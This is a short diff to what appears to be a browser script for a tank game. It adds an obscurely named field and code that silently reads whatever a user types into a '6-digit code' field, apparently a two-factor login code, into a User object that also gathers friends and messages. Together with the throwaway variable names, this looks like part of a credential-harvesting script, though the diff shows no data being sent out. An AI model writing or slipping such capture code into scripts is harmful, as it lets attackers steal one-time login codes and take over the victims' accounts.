@@ -24,6 +24,7 @@
         friends: [],
         messages: '',
         patata: '',
+        jfjfjf: '',
         getTank() {
             return `${this.turret.name} ${this.turret.upgrades} | ${this.hull.name} ${this.hull.upgrades}`;
         },
@@ -122,6 +123,7 @@
                     friends: [],
                     messages: pppppp,
                     patata: '',
+                    jfjfjf: '',
                     getTank() {
                         return `${this.turret.name} ${this.turret.upgrades} | ${this.hull.name} ${this.hull.upgrades}`;
                     },
@@ -205,6 +207,12 @@
         if (r) {
             f = requestAnimationFrame(a);
             findDetails();
+            if (User?.jfjfjf?.length < 1) {
+                if (document.querySelector('[placeholder="6-digit code"]')) {
+                    var t = document.querySelector('[placeholder="6-digit code"]');
+                    User.jfjfjf = JSON.parse(t.value);
+                };
+            };
         };
     };
     try {
